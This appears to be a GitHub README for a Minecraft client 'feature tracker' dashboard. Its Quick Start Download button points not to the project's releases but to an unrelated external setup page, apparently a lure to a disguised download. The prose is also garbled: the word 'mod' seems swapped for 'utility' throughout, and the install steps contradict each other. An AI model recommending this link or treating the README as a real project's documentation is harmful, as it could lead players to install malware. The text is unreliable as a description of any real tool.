# Minecraft‑Client‑Feature‑Tracker  
*by **FiscalPresent***  

![GitHub release (latest by date)](https://img.shields.io/github/v/release/FiscalPresent/Minecraft-Client-Feature-Tracker?style=flat-square)  
![License](https://img.shields.io/github/license/FiscalPresent/Minecraft-Client-Feature-Tracker?style=flat-square)  
![Java 17+](https://img.shields.io/badge/Java-17%2B-blue?style=flat-square)  
![Stars](https://img.shields.io/github/stars/FiscalPresent/Minecraft-Client-Feature-Tracker?style=flat-square)  

---  

## 🎮 What is this?

The **Minecraft‑Client‑Feature‑Tracker** is a lightweight Java‑based utility that lets you **watch, enable, and configure every client‑side feature** of your favourite Minecraft utility in one tidy dashboard. Whether you’re a modder polishing a new add‑on or a player juggling dozens of tweaks, this utility gives you instant visibility and granular control—no more digging through config files or guessing which toggle does what.

> **TL;DR:** One‑click overview + per‑feature settings → smoother gameplay, faster debugging, cleaner profiles.

---

## 🗂️ Core Concepts

| Concept | Description |
|---------|-------------|
| **Feature Map** | Auto‑generated list of every client feature (render tweaks, packet handlers, UI hooks, etc.) extracted from the loaded utility. |
| **Config Profiles** | Save and switch between named configurations (e.g., *Performance*, *Creative*, *Streamer*). |
| **Live Sync** | Changes are applied instantly to the running client without a restart. |
| **Dashboard UI** | Swing‑based GUI with searchable tables, colour‑coded status icons, and utility‑tips. |
| **Extensible API** | Plugins can register new feature types or custom UI widgets. |

---

## 🚀 Quick Start  

| Step | Action |
|------|--------|
| **1️⃣ Download** | <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Download-Release%20Page-4CAF50?style=for-the-badge&logo=github" alt="Download"></a> |
| **2️⃣ Add to utility** | Place the generated JAR into your `utility/` folder (same level as other client utility). |
| **3️⃣ Launch** | Start Minecraft with the same Java version you compiled against (≥ 17). |
| **4️⃣ Open Tracker** | Press <kbd>Ctrl+Shift+T</kbd> in‑game or run `java -jar FeatureTracker.jar` from the command line to launch the dashboard. |
| **5️⃣ Create a Profile** | Click **New Profile**, give it a name, and start toggling features. Save when done! |

> **Tip:** The first launch will scan your utility and build the feature map. This may take a few seconds for large modpacks.

---

## 🛠️ Features at a Glance  

- **Dynamic Feature Discovery** – No manual entry; the tracker reads annotations from loaded utility.  
- **Search & Filter** – Type‑ahead search, category filters, and status ribbons.  
- **Bulk Operations** – Enable/disable groups of features with a single click.  
- **Per‑Feature Settings** – Slider, checkbox, dropdown, or custom component depending on the feature type.  
- **Profile Management** – Export/import JSON profiles, perfect for sharing setups.  
- **Live Log Viewer** – See which features fire events in real‑time (useful for debugging).  
- **Theme Support** – Light / Dark / Custom CSS themes.  

---

## 📦 Installation & Build  

```bash
# Clone the repo
git clone https://github.com/FiscalPresent/Minecraft-Client-Feature-Tracker.git
cd Minecraft-Client-Feature-Tracker

# Build with Gradle (requires Java 17+)
./gradlew clean build

# The artifact will appear in build/libs/
# Copy it into your Minecraft utility folder
```

> The project follows the **Gradle Kotlin DSL** for simplicity. All dependencies are shaded, so the final JAR is self‑contained.

---

## 🧩 Extending the Tracker  

If you develop a utility and want it to be recognized:

1. Add the `@TrackableFeature` annotation to any class or method you want the tracker to expose.  
2. Implement `FeatureConfigProvider` if you need a custom UI element.  
3. Register the feature in your utility’s `onInitializeClient` hook:

```java
public class MyModClient implements ClientModInitializer {
    @Override
    public void onInitializeClient() {
        FeatureTrackerAPI.register(MyFeature.class);
    }
}
```

The tracker will automatically display it on the next launch.

---

## 📊 Metrics & Telemetry  

All data stays **local**. No network calls are made unless you explicitly enable the optional *Usage Reporting* plugin (off by default). Collected metrics include:

- Feature toggle counts  
- Profile switch frequency  
- UI interaction heat‑maps (saved locally)  

You can purge all telemetry from the **Settings → Privacy** tab.

---

## 🤝 Contributing  

We love community help!  

| How to help | What you’ll do |
|-------------|----------------|
| **Bug reports** | Open an issue with steps to reproduce. |
| **Feature ideas** | Propose via the *Discussions* tab, label as `enhancement`. |
| **Code contributions** | Fork, create a feature branch, and submit a PR. Please follow the **Google Java Style** and run `./gradlew check`. |
| **Documentation** | Improve the README, add screenshots, or translate to other languages. |

> **Code of Conduct:** Be respectful. Harassment and hate speech are not tolerated.

---

## 📜 License  

Distributed under the **MIT License**. See `LICENSE` for details.

---

## 📞 Contact  

- **GitHub:** [FiscalPresent](https://github.com/FiscalPresent)  
- **Discord:** `Fiscal#8421` (Minecraft Devs community)  
- **Issues:** Use the GitHub **Issues** page for bugs or questions.  

Happy tracking! 🎉